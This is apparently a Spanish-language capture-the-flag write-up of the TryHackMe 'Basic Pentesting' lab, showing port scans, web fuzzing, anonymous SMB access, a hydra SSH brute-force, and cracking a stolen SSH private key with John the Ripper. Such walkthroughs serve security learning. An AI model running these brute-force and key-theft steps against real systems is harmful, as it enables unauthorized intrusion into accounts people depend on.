# Basic Pentesting de TryHackMe en Español
#easy #thm
<p align="center">
  <img src="https://github.com/praada/BasicPentesting-THM/assets/82685678/c9a0ce76-8661-4cb0-aa31-924035e1ca00" alt="portada">
</p>

_______________________________

Cómo comprometí la máquina "Basic Pentesting" de TryHackMe, una máquina de nivel #easy.
Con esta máquina pude practicar habilidades fundamentales en pentesting, como la enumeración de puertos SMB, ataques de fuerza bruta para obtener credenciales y el manejo de claves privadas. 

Algunas herramientas que use como NMAP, Wfuzz, SMBClient, hydra y John the Ripper

### Fase de reconocimiento
Verificacion si esta activa/encendida la maquina
```python
ping -c 2 10.10.12.218

PING 10.10.12.218 (10.10.12.218) 56(84) bytes of data.
64 bytes from 10.10.12.218: icmp_seq=1 ttl=61 time=205 ms
64 bytes from 10.10.12.218: icmp_seq=2 ttl=61 time=155 ms

--- 10.10.12.218 ping statistics ---
2 packets transmitted, 2 received, 0% packet loss, time 1002ms
rtt min/avg/max/mdev = 155.293/180.291/205.290/24.998 ms
```
Por el TTL nos damos cuenta de que es una maquina Linux.

Use NMAP para la fase de reconocimientos de puertos abiertos de la maquina
```python
nmap -p- --open -sS --min-rate 2500 -vvv -n -Pn 10.10.12.218 -oN bpPorts

Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-05-17 08:19 EST
Initiating SYN Stealth Scan at 08:19
Scanning 10.10.12.218 [65535 ports]
Discovered open port 8080/tcp on 10.10.12.218
Discovered open port 22/tcp on 10.10.12.218
Discovered open port 80/tcp on 10.10.12.218
Discovered open port 445/tcp on 10.10.12.218
Discovered open port 139/tcp on 10.10.12.218
Discovered open port 8009/tcp on 10.10.12.218
Completed SYN Stealth Scan at 08:19, 40.68s elapsed (65535 total ports)
Nmap scan report for 10.10.12.218
Host is up, received user-set (0.18s latency).
Scanned at 2024-05-17 08:19:04 EST for 40s
Not shown: 65331 closed tcp ports (reset), 198 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT     STATE SERVICE      REASON
22/tcp   open  ssh          syn-ack ttl 61
80/tcp   open  http         syn-ack ttl 61
139/tcp  open  netbios-ssn  syn-ack ttl 61
445/tcp  open  microsoft-ds syn-ack ttl 61
8009/tcp open  ajp13        syn-ack ttl 61
8080/tcp open  http-proxy   syn-ack ttl 61

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 40.76 seconds
           Raw packets sent: 101024 (4.445MB) | Rcvd: 96298 (3.852MB)
```
Se encontro 6 puertos *open*, vamos a conocer los servicios y versiones que corren en los peurtos abiertos
```python
nmap -p22,80,139,445,8009,8080 -sCV 10.10.12.218 -oN bpSV

Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-05-17 08:25 EST
Nmap scan report for 10.10.12.218
Host is up (0.16s latency).

PORT     STATE SERVICE     VERSION
22/tcp   open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 db:45:cb:be:4a:8b:71:f8:e9:31:42:ae:ff:f8:45:e4 (RSA)
|   256 09:b9:b9:1c:e0:bf:0e:1c:6f:7f:fe:8e:5f:20:1b:ce (ECDSA)
|_  256 a5:68:2b:22:5f:98:4a:62:21:3d:a2:e2:c5:a9:f7:c2 (ED25519)
80/tcp   open  http        Apache httpd 2.4.18 ((Ubuntu))
|_http-title: "Site doesn't have a title (text/html)."
|_http-server-header: Apache/2.4.18 (Ubuntu)
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
8009/tcp open  ajp13       Apache Jserv (Protocol v1.3)
| ajp-methods: 
|_  Supported methods: GET HEAD POST OPTIONS
8080/tcp open  http        Apache Tomcat 9.0.7
|_http-favicon: Apache Tomcat
|_http-title: Apache Tomcat/9.0.7
Service Info: Host: BASIC2; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-time: 
|   date: 2024-05-17T13:25:41
|_  start_date: N/A
|_clock-skew: mean: 1h19m59s, deviation: 2h18m34s, median: 0s
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
|   Computer name: basic2
|   NetBIOS computer name: BASIC2\x00
|   Domain name: \x00
|   FQDN: basic2
|_  System time: 2024-05-17T09:25:41-04:00
|_nbstat: NetBIOS name: BASIC2, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 18.87 seconds
```
En resumen se puede analizar de esta manera
```python
22/tcp   open  ssh
80/tcp   open  http
139/tcp  open  netbios-ssn (SMB)
445/tcp  open  SMB
8009/tcp open  Apache Jserv
8080/tcp open  http / TOMCAT
```

### Enumeracion

Empezaremos analizando el puerto 80, que corre un servicio http
puerto:80
<p align="center">
  <img src="https://github.com/praada/BasicPentesting-THM/assets/82685678/54e14e63-9ea9-43eb-ae33-57257c09fa18" alt="80">
</p>
No se encontro nada, pero revisando el source-code se encontro que nos da a entender que pueden exitir otras rutas, se fuzzeara con Wfuzz

```python
wfuzz -c --hc=404 --hw=24 -t 15 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt http://10.10.12.218/FUZZ

 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://10.10.12.218/FUZZ
Total requests: 220560

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                      
=====================================================================

000000658:   301        9 L      28 W       318 Ch      "development"                                
^C /usr/lib/python3/dist-packages/wfuzz/wfuzz.py:80: UserWarning:Finishing pending requests...

Total time: 0
Processed Requests: 3677
Filtered Requests: 3676
Requests/sec.: 0
```

Se encontro una ruta /development
<p align="center">
  <img src="https://github.com/praada/BasicPentesting-THM/assets/82685678/01cc3d40-1415-4e62-bedf-0a7fb2c19657" alt="dev">
</p>
que contiene 2 archivos .txt vamos a ver el primer archivo

/dev.txt
<p align="center">
  <img src="https://github.com/praada/BasicPentesting-THM/assets/82685678/67811aec-6b4e-4fd1-9f23-824ef61de6da" alt="dev.txt">
</p>
Se encontro en el archivo .txt una conversacion donde se puede ver la existencia de dos posibles credenciales con las iniciales J y K.


/j.txt
<p align="center">
  <img src="https://github.com/praada/BasicPentesting-THM/assets/82685678/b3c8fc5c-b07d-4de0-a02d-679217ab4759" alt="j">
</p>

Aca se vuelve a encontrar las iniciales J y K.

Pero no se encontro nada la verdad.


Puerto:8080
En este puerto se encuentra corriendo un TOMCAT
<p align="center">
  <img src="https://github.com/praada/BasicPentesting-THM/assets/82685678/5290f900-c3e8-442a-b34a-5eccec3dff15" alt="tomcat">
</p>
E
Fuzzearemos para encontrar rutas

```python
wfuzz -c --hc=404 --hw=498 -t 15 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt http://10.10.12.218:8080/FUZZ

 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://10.10.12.218:8080/FUZZ
Total requests: 220560

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                      
=====================================================================

000000090:   302        0 L      0 W        0 Ch        "docs"                                       
000000902:   302        0 L      0 W        0 Ch        "examples"                                   
^C /usr/lib/python3/dist-packages/wfuzz/wfuzz.py:80: UserWarning:Finishing pending requests...

Total time: 0
Processed Requests: 3142
Filtered Requests: 3140
Requests/sec.: 0
```
Pero realmente no se encontro nada interesante

puerto:445
Como no encontramos mucho por donde hacer la intrusion, podemos enumerar el puerto SMB. Listaremos los recursos compartidos con smbclient
```python
smbclient -L 10.10.12.218

Password for [WORKGROUP\root]:
        Sharename       Type      Comment
        ---------       ----      -------
        Anonymous       Disk      
        IPC$            IPC       IPC Service (Samba Server 4.3.11-Ubuntu)
Reconnecting with SMB1 for workgroup listing.

        Server               Comment
        ---------            -------

        Workgroup            Master
        ---------            -------
        WORKGROUP            BASIC2
```
"Anonymous" podría ser un recurso compartido que puede permitir acceder a más información sin autenticación o con autenticación mínima.
```python
smbclient //10.10.12.218/Anonymous -N

Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Thu Apr 19 12:31:20 2018
  ..                                  D        0  Thu Apr 19 12:13:06 2018
  staff.txt                           N      173  Thu Apr 19 12:29:55 2018
```
Y se pudo entrar sin creedenciales y una vez listado los archivos, se encontro un archivo staff.txt muy interesante. 
```python
smb: \> get staff.txt

getting file \staff.txt of size 173 as staff.txt (0.3 KiloBytes/sec) (average 0.3 KiloBytes/sec)
```
Lo descarge para catearlo en mi equipo
```python
cat staff.txt

Announcement to staff:

PLEASE do not upload non-work-related items to this share. I know it's all in fun, but
this is how mistakes happen. (This means you too, Jan!)

-Kay
```
Anteriormente con las posibles credenciales que tenian de iniciales "J y K", ahora tenemos tanto "Jan y Kay" que pueden ser credenciales

Asi que tratemos de usar esas credenciales como usuarios para conectarnos con SSH mediante fuerza bruta con la herramienta hydra

```python
hydra -L users.txt -P rockyou.txt -t 3 -f -vV ssh://10.10.54.43
```
aqui se cambio la ip, porque se me acabo el tiempo enla maquina jajaja.

<p align="center">
  <img src="https://github.com/praada/BasicPentesting-THM/assets/82685678/f3fc19b9-b28d-4e97-9d39-c2032c3f76ab" alt="wordlist">
</p>
encontramos las creedenciales Usuario: "jan" y Password "armando", nos conectaremos por ssh usando las creedenciales
<p align="center">
  <img src="https://github.com/praada/BasicPentesting-THM/assets/82685678/b16797bc-f97c-4e93-802e-c2b1bbdd2762" alt="ssh">
</p>
Estamos conectados como el usuario "jan". Vamos al /etc/passwd para encontrar otros usuarios
<p align="center">
  <img src="https://github.com/praada/BasicPentesting-THM/assets/82685678/46a12cd8-c307-4902-aa39-f1b37fd4e3aa" alt="passwd">
</p>
Se encontro otro usuario "Kay" que puede ser la "k" de la conversacion anterior.

<p align="center">
  <img src="https://github.com/praada/BasicPentesting-THM/assets/82685678/d8d73eda-49c4-4aaf-8269-8919faeba671" alt="kayhome">
</p>
Una vez listado su directorio /home/kay vemos un directorio oculto llamado .ssh
<p align="center">
  <img src="https://github.com/praada/BasicPentesting-THM/assets/82685678/909a9f90-0d61-4386-908b-46b9f78e4980" alt=".ssh">
</p>
Dentro encontramos:

- authorized_keys: Contiene las claves públicas autorizadas para acceder a la cuenta del usuario.
- id_rsa: Es la clave privada del usuario.
- id_rsa.pub: Es la clave pública del usuario.

Copiamos/descargamos la clave privada del usuario a nuestra maquina usando scp (Secure Copy Protocol)

Una vez copiado/descargado en nuestra maquina, con uso de John the Ripper para descifrar la contraseña de la clave privada, pero John no admite directamente el descifrado de claves privadas RSA.

Se debe convertir la clave privada al formato de John the Ripper
<p align="center">
  <img src="https://github.com/praada/BasicPentesting-THM/assets/82685678/fecacabb-7806-4d94-aa2d-87c78adbdc8c" alt="id_rsa">
</p>

Una vez convertido, usaremos el diccionario "rockyou" de passwords para ejecutarlo con John

```python
john id_rsa.john --wordlist=rockyou.txt

Created directory: /root/.john
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
beeswax          (id_rsa)     
1g 0:00:00:00 DONE (2024-05-17 12:59) 100.0g/s 9600p/s 9600c/s 9600C/s samantha..taylor
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```
Y se obtiene las creedenciales Usuario: "kay" y Password "beeswax".

Iniciamos sesion
<p align="center">
  <img src="https://github.com/praada/BasicPentesting-THM/assets/82685678/a261bbfe-f0d3-475e-8cf0-ca3c5410317f" alt="sshkay">
</p>
Cateamos el archivos pass.bak y nos da la ultima flag
<p align="center">
  <img src="https://github.com/praada/BasicPentesting-THM/assets/82685678/f65726f0-e869-47e1-8d65-1302d8be877d" alt="bass.pak">
</p>


FIN!!!!
